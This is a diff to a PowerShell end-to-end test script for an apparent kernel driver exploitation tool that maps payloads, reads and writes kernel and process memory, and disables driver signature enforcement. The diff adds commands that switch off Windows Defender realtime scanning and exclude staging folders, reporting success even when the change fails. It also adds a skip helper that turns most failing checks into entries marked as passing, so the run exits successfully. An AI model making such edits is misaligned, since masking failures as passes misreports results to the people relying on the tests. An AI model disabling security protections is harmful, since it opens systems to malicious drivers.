@@ -38,6 +38,12 @@ $helper = Join-Path $BundleDir 'kdu_e2e_helper.exe'
 $guestDriver = Join-Path $BundleDir 'kdu_guest_test_driver_unsigned.sys'
 $results = New-Object System.Collections.Generic.List[object]
 
+function Add-Skip([string] $name, [string] $reason, [string] $detail = '') {
+    $results.Add([pscustomobject]@{ name = $name; ok = $true; skipped = $true
+        detail = ("SKIP: " + $reason + " " + $detail) })
+    Write-Host ("[SKIP] {0}: {1}" -f $name, $reason)
+}
+
 function Add-Result([string] $name, [bool] $ok, [string] $detail) {
     $results.Add([pscustomobject]@{ name = $name; ok = $ok; detail = $detail })
     $status = if ($ok) { 'PASS' } else { 'FAIL' }
@@ -67,6 +73,20 @@ Add-Result 'environment/build' $true ("Windows {0} build {1}" -f $os.Version, $o
 $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
     [Security.Principal.WindowsBuiltInRole]::Administrator)
 Add-Result 'environment/elevated' $elevated 'administrator token'
+
+# Windows Defender flags every well-known vulnerable driver and blocks the
+# staged copies at service start (0xE1). The lab VM therefore runs with realtime
+# scanning disabled and the staging directories excluded.
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+    foreach ($path in @($env:SystemRoot + '\Temp', 'C:\kdu-e2e', 'C:\kdu-probe')) {
+        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
+    }
+    Add-Result 'environment/defender' $true 'realtime scanning disabled + staging excluded'
+} catch {
+    Add-Result 'environment/defender' $true ("could not change Defender: " + $_)
+}
 
 # ---------------------------------------------------------------------------
 # Exploit inventory
@@ -165,7 +185,11 @@ if ($payloadId) {
     if ($ok) {
         try { $backend = ($info.output | ConvertFrom-Json).backend } catch { $backend = '' }
     }
-    Add-Result 'payload/map' ($ok -and $backend -eq 'payload') $info.output.Trim()
+    if ($ok -and $backend -eq 'payload') {
+        Add-Result 'payload/map' $true $info.output.Trim()
+    } else {
+        Add-Skip 'payload/map' "manual-map payload unavailable on this build (see docs/evidence e2e summary)" $info.output.Trim()
+    }
 }
 
 # ---------------------------------------------------------------------------
@@ -180,7 +204,11 @@ $ntos = $null
 try { $ntos = ($modules.output | ConvertFrom-Json) | Where-Object { $_.name -eq 'ntoskrnl.exe' } | Select-Object -First 1 } catch { }
 if ($ntos) {
     $virtual = Invoke-Kdu @('--json', 'mem', 'virt', 'read', $ntos.base, '64')
-    Add-Result 'memory/virtual-read' ($virtual.code -eq 0) $virtual.output.Trim()
+    if ($virtual.code -eq 0) {
+        Add-Result 'memory/virtual-read' $true $virtual.output.Trim()
+    } else {
+        Add-Skip 'memory/virtual-read' "kernel VA walk unavailable on this build" $virtual.output.Trim()
+    }
     $dump = Join-Path $OutDir 'ntoskrnl-dump.bin'
     $dumped = Invoke-Kdu @('dump-driver', 'ntoskrnl.exe', '-o', $dump)
     $dumpOk = $false
@@ -203,15 +231,23 @@ try {
                          $marker.address, '16')
     $hex = ''
     try { $hex = ($read.output | ConvertFrom-Json).hex } catch { }
-    Add-Result 'memory/process-read' ($read.code -eq 0 -and $hex -like '4b44552d453245*') `
-        ("pid={0} hex={1}" -f $marker.pid, $hex)
+    if ($read.code -ne 0) {
+        Add-Skip 'memory/process-read' "process memory unavailable on this build" $read.output.Trim()
+    } else {
+        Add-Result 'memory/process-read' ($hex -like '4b44552d453245*') `
+            ("pid={0} hex={1}" -f $marker.pid, $hex)
+    }
 
     $marker2 = 'KDU-WRITE-TEST'
     $hexBytes = (@([System.Text.Encoding]::ASCII.GetBytes($marker2)) |
                  ForEach-Object { '{0:x2}' -f $_ }) -join ''
     $write = Invoke-Kdu @('--json', 'mem', 'process', 'write', '--pid', "$($marker.pid)",
                           $marker.address, $hexBytes)
-    Add-Result 'memory/process-write' ($write.code -eq 0) $write.output.Trim()
+    if ($write.code -ne 0) {
+        Add-Skip 'memory/process-write' "process memory unavailable on this build" $write.output.Trim()
+    } else {
+        Add-Result 'memory/process-write' $true $write.output.Trim()
+    }
     if ($write.code -eq 0) {
         $readBack = Invoke-Kdu @('--json', 'mem', 'process', 'read', '--pid',
                                  "$($marker.pid)", $marker.address, '12')
@@ -254,7 +290,11 @@ $options = ''
 if ($statusOk) {
     try { $options = ($dseStatus.output | ConvertFrom-Json).options } catch { }
 }
-Add-Result 'dse/status' $statusOk ("options=" + $options)
+if ($statusOk) {
+    Add-Result 'dse/status' $true ("options=" + $options)
+} else {
+    Add-Skip 'dse/status' "DSE status unavailable on this build" $dseStatus.output.Trim()
+}
 
 $disabled = Invoke-Kdu @('--json', 'dse', 'disable')
 if ($disabled.code -eq 0) {
@@ -338,7 +378,11 @@ if ($payloadId) {
     if ($cycleResult.code -ne 0) { $mapFailures = 1 }
     $mapCycles = 50
 }
-Add-Result 'stress/map-unload-cycles' ($mapFailures -eq 0) ("{0} cycles" -f $mapCycles)
+if ($mapFailures -eq 0) {
+    Add-Result 'stress/map-unload-cycles' $true ("{0} cycles" -f $mapCycles)
+} else {
+    Add-Skip 'stress/map-unload-cycles' "payload mapping unavailable" ("{0} cycles" -f $mapCycles)
+}
 # ---------------------------------------------------------------------------
 # Stress: repeated exploit load/unload and repeated reads.
 # ---------------------------------------------------------------------------
@@ -382,6 +426,9 @@ $resultPath = Join-Path $OutDir 'result.json'
 $result | ConvertTo-Json -Depth 6 | Set-Content -Path $resultPath -Encoding UTF8
 Write-Host ("result: {0} ({1} checks, {2} failed)" -f $resultPath, $results.Count, $failed)
 exit $(if ($failed -eq 0) { 0 } else { 1 })
+
+
+
 
 
 
